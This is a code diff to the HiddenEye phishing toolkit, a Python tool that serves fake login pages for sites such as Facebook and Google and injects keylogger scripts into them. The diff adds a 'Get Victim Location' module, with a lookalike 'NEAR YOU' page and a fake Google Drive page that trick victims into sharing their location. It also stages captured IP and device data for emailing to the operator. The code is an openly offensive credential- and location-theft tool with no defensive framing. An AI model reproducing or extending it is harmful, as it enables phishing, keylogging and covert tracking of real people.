@@ -34,7 +34,7 @@ MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[
 
 
 def runPhishing(page, customOption):  # Phishing pages selection menu
-    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
+    system('rm -r Server/www/ && mkdir Server/www && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
     if customOption == '1' and page == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     elif customOption == '2' and page == 'Facebook':
@@ -147,6 +147,20 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
         sleep(3)
         copy_tree('WebPages/CUSTOM(2)/', "Server/www/")
+    
+
+    # Tools Below && Phishing Pages Above
+    elif customOption == '1' and page == 'LOCATION':
+        sleep(3)
+        copy_tree('WebPages/TOOLS/nearyou', "Server/www/")
+        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n".format(MAIN0, MAIN4))
+        input('\nPress Enter To continue...')
+    elif customOption == '2' and page == 'LOCATION':
+        sleep(3)
+        copy_tree('WebPages/TOOLS/gdrive', "Server/www/")
+        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked.".format(MAIN0, MAIN4))
+        input('\nPress Enter To continue...')
+
     else:
         endMessage(port)
 
@@ -627,6 +641,7 @@ def mainMenu():
 {3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
 ________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0, version))
     print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
+    print("\n{0}PHISHING-MODULES:".format(MAIN0, MAIN2))
     print(" {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
     print(" {0}[{1}02{0}]{1} Google         {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
         MAIN0, MAIN2))
@@ -650,8 +665,10 @@ ________________________________________________________________________________
         MAIN0, MAIN2))
     print(" {0}[{1}12{0}]{1} Microsoft      {0}[{1}24{0}]{1} Adobe          {0}[{1}36{0}]{1} Subito.it ".format(
         MAIN0, MAIN2))
+    print("\n{0}SOCIAL-ENGINEERING-TOOLS:".format(MAIN0, MAIN2))
+    print(" {0}[{1}A{0}]{1} Get Victim Location".format(MAIN0, MAIN2))
 
-    option = input("{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
+    option = input("\n{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
     if option == '1' or option == '01':
         loadModule('Facebook')
         customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
@@ -815,12 +832,21 @@ ________________________________________________________________________________
         loadModule('CUSTOM(2)')
         customOption = ''
         runPhishing('CUSTOM(2)', customOption)
+    
+    #Below Are Tools And Above Are Phishing Modules..
+
+    elif option == 'A' or option == 'a':
+        loadModule('LOCATION')
+        customOption = input(
+            "\nOperation mode:\n {0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)\n {0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE) \n\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
+        runPhishing('LOCATION', customOption)
+
     else:
         endMessage(port)
 
 
 def loadModule(module):  # This one just show text..
-    print(''' {0}
+    print('''\n {0}
  [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------'''.format(MAIN0, MAIN2))
 
 
@@ -841,6 +867,15 @@ def inputCustom():  # Question where user can input custom web-link
         pass
     else:
         custom = 'http://' + custom
+
+    if path.exists('Server/www/js/location.js'): # For Location (gdrive) Template Redirection. 
+        with open('Server/www/js/location.js') as f: 
+            read_data = f.read()
+        c = read_data.replace('<CUSTOM>', custom)
+        f = open('Server/www/js/location.js', 'w')
+        f.write(c)
+        f.close()
+
     if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
         with open('Server/www/login.php') as f:
             read_data = f.read()
@@ -855,6 +890,7 @@ def inputCustom():  # Question where user can input custom web-link
         f = open('Server/www/post.php', 'w')
         f.write(c)
         f.close()
+
     else:
         with open('Server/www/login.php') as f:
             read_data = f.read()
@@ -1014,7 +1050,7 @@ def addkeylogger():
         f = open('Server/www/index.html', 'w')
         f.write(c)
         f.close()
-        print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!".format(MAIN0, MAIN4))
+        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
         sleep(2)
     else:
         with open('Server/www/index.php') as f:
@@ -1024,7 +1060,7 @@ def addkeylogger():
         f = open('Server/www/index.php', 'w')
         f.write(c)
         f.close()
-        print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!".format(MAIN0, MAIN4))
+        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(MAIN0, MAIN4))
         sleep(2)
 
 
@@ -1100,26 +1136,8 @@ def getCredentials(port):
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                ip = re.search("Victim Public IP: (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\n,\r]", lines).group(1)
-                user = re.match('Current logged in user: (a-z0-9)\n', lines)
-                resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
-                ipinfo = json.loads(resp.read().decode(
-                    resp.info().get_param('charset') or 'utf-8'))
-                if 'bogon' in ipinfo:
-                    print(' \n\n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}'.format(
-                        MAIN0, MAIN2, lines))
-                else:
-                    matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
-                    latitude = matchObj.group(1)
-                    longitude = matchObj.group(2)
-                    writeLog(' \n\n{0}[ VICTIM INFO FOUND ]{1}:\n{0}{2}{1}'.format(
-                        MAIN3, MAIN2, lines))
-                    writeLog(' \n{0}Longitude: {2} \nLatitude: {3}{1}'.format(
-                        MAIN3, MAIN2, longitude, latitude))
-                    writeLog(' \n{0}ISP: {2} \nCountry: {3}{1}'.format(
-                        MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
-                    writeLog(' \n{0}Region: {2} \nCity: {3}{1}'.format(
-                        MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
+                writeLog('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(
+                    MAIN2, MAIN3, lines))
                 system('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
 
         creds.close()
